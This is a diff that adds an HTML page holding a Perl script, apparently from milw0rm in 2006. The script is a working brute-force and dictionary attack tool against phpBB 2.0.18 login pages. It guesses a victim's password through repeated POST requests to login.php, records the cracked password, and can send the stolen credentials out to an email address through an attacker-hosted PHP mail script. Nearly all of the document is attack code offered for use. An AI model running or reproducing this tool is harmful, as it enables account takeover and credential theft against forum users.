@@ -1,0 +1,138 @@
+<html>
+<head>
+<title>phpBB <= 2.0.18 Remote Bruteforce/Dictionary Attack Tool (updated)</title>
+<pre>
+#!/usr/bin/perl
+####################################################################################################################
+# Title: PhpBB &lt;= 2.0.18 Remote Bruteforce/Dictionary Attack Tool
+# Type: Bruteforce / Dictionary attack
+# New demo: http://rapidshare.de/files/13694254/phpbbbtr.avi.html (1.06 mb)
+# Php Email Script data:  &lt;? mail($destinataire, $objet, $contenu, &quot;From: $expediteur\r\nReply-To: $expediteur&quot;); ?&gt;
+# Note: Host the php script and replace the line 34 [] Php script for the email option because win32 don't support Mail::Mailer
+# Changelog: Bruteforce option | Starting length | Email option | More fast | Die error disabled | 
+# Credits: Fully coded by DarkFig
+# Greetz: Romano [] Pgeo [] Fred [] CrackJerem [] Volcom [] Ddxs [] The truth [] And all man who like me =)
+####################################################################################################################
+use IO::Socket;
+use LWP::Simple;
+
+#_Utilisation_
+if(@ARGV &lt; 6){
+print q(
++---------------------------------------------------------------------------------------------------+
+|             PhpBB &lt;= 2.0.18 Remote Bruteforce/Dictionary Attack Tool [~_~] by DarkFig             |
++---------------------------------------------------------------------------------------------------+
+|      Usage: phpbbbtr.pl &lt;host&gt; &lt;path&gt; &lt;port&gt; &lt;attack&gt; &lt;char&gt; &lt;length&gt; &lt;victim&gt; &lt;log&gt; &lt;email&gt;      |
++---------------------------------------------------------------------------------------------------+
+| &lt;host&gt;   | The host where the php flaw is installed                       | [Ex: victim.com]      |
+| &lt;path&gt;   | Path of the php flaw                                           | [Ex: /vuln/]          |
+| &lt;port&gt;   | Port of the host                                               | [Ex: 80]              |
+| &lt;attack&gt; | Bruteforce[-btr] or Dictionary[-dict]                          | [Ex: -dict]           |
+| &lt;char&gt;   | Bruteforce[upperalpha, loweralpha, numeric] or Dictionary file | [Ex: dico.txt]        |
+| &lt;length&gt; | For the bruteforce option, define a starting length            | [Ex: 7]               |
+| &lt;victim&gt; | The victim's username                                          | [Ex: L4m3r]           |
+| &lt;log&gt;    | [Optional] File where you want to save the password            | [Ex: results.txt]     |
+| &lt;email&gt;  | [Optional] Email where the password will be sent               | [Ex: haxor@gmail.com] |
++---------------------------------------------------------------------------------------------------+
+);exit;}
+
+#_Configuration_
+$mailsite = &quot;http://yoursite.com/mailme.php&quot;; #Replace this value by the Url of the Php email script
+$shipper  = &quot;xploitdarkfigbot%40gmail.com&quot;; #Default shipper email, xploidarkfigbot@gmail.com really exist =&gt; It work ;)
+$host     = $ARGV[0];
+$path     = $ARGV[1];
+$port     = $ARGV[2];
+$attack   = $ARGV[3];
+$content  = $ARGV[4];
+if($attack eq &quot;-btr&quot;){$length = $ARGV[5];$username = $ARGV[6];$results = $ARGV[7];if(!$ARGV[9]){$mailoption = 0;} else {$mailoption = 1;$email = $ARGV[8];}}
+else {$username = $ARGV[5];$results = $ARGV[6];if(!$ARGV[7]){$mailoption = 0;} else {$mailoption = 1;$email = $ARGV[7];}}
+$nligne   = &quot;-1&quot;;
+$postit = &quot;$path&quot;.&quot;login.php&quot;;
+$full     = &quot;http://&quot;.&quot;$host&quot;.&quot;$path&quot;;&amp;hello;
+
+#_Hello_
+sub hello() {
+if($attack eq &quot;-dict&quot;){open dictionary, &quot;&lt;$content&quot; || print &quot;  [-]Can't open the file.&quot;;chomp(@dico = &lt;dictionary&gt;);}
+print &quot;\n
++--------------------------------------------------------+
+ PhpBB &lt;= 2.0.18 Remote Bruteforce/Dictionary Attack Tool
++--------------------------------------------------------+
+  [+]   Attack: &quot;;if($attack eq &quot;-btr&quot;){print &quot;Bruteforce&quot;;}if($attack eq &quot;-dict&quot;){print &quot;Dictionary&quot;;};print&quot; 
+  [+]   Target: $full
+  [+]     Port: $port
+  [+] Username: $username
++--------------------------------------------------------+&quot;;
+if($content eq &quot;upperalpha&quot;){$nligne = &quot;A&quot;;}
+if($content eq &quot;loweralpha&quot;){$nligne = &quot;a&quot;;}
+if($content eq &quot;numeric&quot;){$nligne = &quot;0&quot;;}
+if($attack  eq &quot;-dict&quot;){&amp;dictio;}if($attack  eq &quot;-btr&quot;){&amp;generate;}}
+
+#_Bruteforce_
+sub generate() {
+$nligne x= $length;
+$passwordz = $nligne;
+print &quot;\n  [~]Trying the password: $passwordz&quot;;
+&amp;phpbb;}
+
+sub btrfr() {
+$nligne++;
+$passwordz = $nligne;
+print &quot;\n  [~]Trying the password: $passwordz&quot;;
+&amp;phpbb;}
+
+#_Dictionary_
+sub dictio() {
+$nligne++;
+$passwordz = $dico[$nligne];
+if($passwordz eq &quot;&quot;){&amp;successfailed;}
+print &quot;\n  [~]Trying the password: $passwordz&quot;;
+&amp;phpbb;}
+
+#_Socket_
+sub phpbb(){
+while ($OK ne 1){
+$data   = &quot;username=&quot;.&quot;$username&quot;.&quot;&amp;password=&quot;.&quot;$passwordz&quot;.&quot;&amp;redirect=&amp;login=Connexion&quot;;
+$length = length $data;
+my $send = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;,PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;$port&quot;) || print &quot;\n  [-]Can't connect to the host.&quot;;
+print $send &quot;POST $postit HTTP/1.1
+Host: $host
+Content-Type: application/x-www-form-urlencoded
+Content-Length: $length
+
+$data&quot;;
+read  $send, $answer, 15;
+close($send);
+if($answer =~ /HTTP\/(.*?) 302/){$OK = 1;}
+&amp;decision;}}
+
+#_Decision_
+sub decision(){if($OK ne 1){if($attack  eq &quot;-dict&quot;){&amp;dictio;}if($attack  eq &quot;-btr&quot;){&amp;btrfr;}} else {&amp;successfailed;}}
+
+#_Success/Failed_
+sub successfailed(){
+if($OK eq 1){print &quot;\n  [+]User: $username\n  [+]Password: $passwordz&quot;;}
+if($OK eq 0){print &quot;\n  [-]User: $username\n  [-]Password: Not found&quot;;}
+open FILE, &quot;&gt;$results&quot; || print &quot;\n  [-]Can't write the file.&quot;;
+print FILE &quot;
++--------------------------------------------------------+
+ PhpBB &lt;= 2.0.18 Remote Bruteforce/Dictionary Attack Tool
++--------------------------------------------------------+
+  [+]   Target: $full
+  [+]     Port: $port
+  [+] Username: $username
+  [+] Password: &quot;;
+if($OK eq 1){print FILE &quot;$passwordz&quot;;}
+if($OK eq 0){print FILE &quot;Not found...&quot;;$passwordz = &quot;Not found&quot;;}
+print FILE &quot;\n+--------------------------------------------------------+\n&quot;;
+close FILE; close dictionary;
+
+#_EmailOption_
+if($mailoption eq 1){
+$fullmailurl = &quot;$mailsite&quot;.&quot;?expediteur=&quot;.&quot;$shipper&quot;.&quot;&amp;destinataire=&quot;.&quot;$email&quot;.&quot;&amp;objet=&quot;.&quot;[Xploit]Results for $host&quot;.&quot;&amp;contenu=&quot;.&quot;Target: $full&quot;.&quot;%0D%0A&quot;.&quot;Port: $port&quot;.&quot;%0D%0A&quot;.&quot;Username: $username&quot;.&quot;%0D%0A&quot;.&quot;Password: $passwordz&quot;;
+$mailpg      = get($fullmailurl) || print &quot;\n  [-]Can't connect to the email script hoster.\n+--------------------------------------------------------+\n\n&quot; and exit;
+print &quot;\n  [+]Email sent, check your mail !\n+--------------------------------------------------------+\n\n&quot;;} else {print &quot;\n+--------------------------------------------------------+\n&quot;;}exit;}
+
+# milw0rm.com [2006-02-20]
+</pre>
+</html>
+
